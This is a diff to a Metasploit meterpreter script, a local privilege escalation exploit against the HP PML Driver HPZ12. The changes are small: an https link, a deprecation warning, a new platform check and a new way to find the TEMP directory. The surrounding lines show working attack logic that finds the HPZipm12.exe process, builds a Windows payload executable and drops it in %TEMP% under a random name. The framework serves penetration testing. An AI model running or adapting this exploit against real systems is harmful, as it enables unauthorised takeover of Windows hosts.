@@ -2,8 +2,16 @@
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# https://metasploit.com/framework/
 ##
+
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to improve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
 
 ##
 # HP Multiple Products PML Driver HPZ12 Local Privilege Escalation.
@@ -55,7 +63,7 @@ end
 
 if rhost.nil? or rport.nil?
   usage
-if client.platform =~ /win32|win64/
+if client.platform == 'windows'
   client.sys.process.get_processes().each do |m|
     if ( m['name'] =~ /HPZipm12\.exe/ )
 
@@ -70,7 +78,7 @@ if client.platform =~ /win32|win64/
       exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
 
       # Place our newly created exe in %TEMP%
-      tempdir = client.fs.file.expand_path("%TEMP%")
+      tempdir = client.sys.config.getenv('TEMP')
       tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
       print_status("Sending EXE payload '#{tempexe}'.")
       fd = client.fs.file.new(tempexe, "wb")
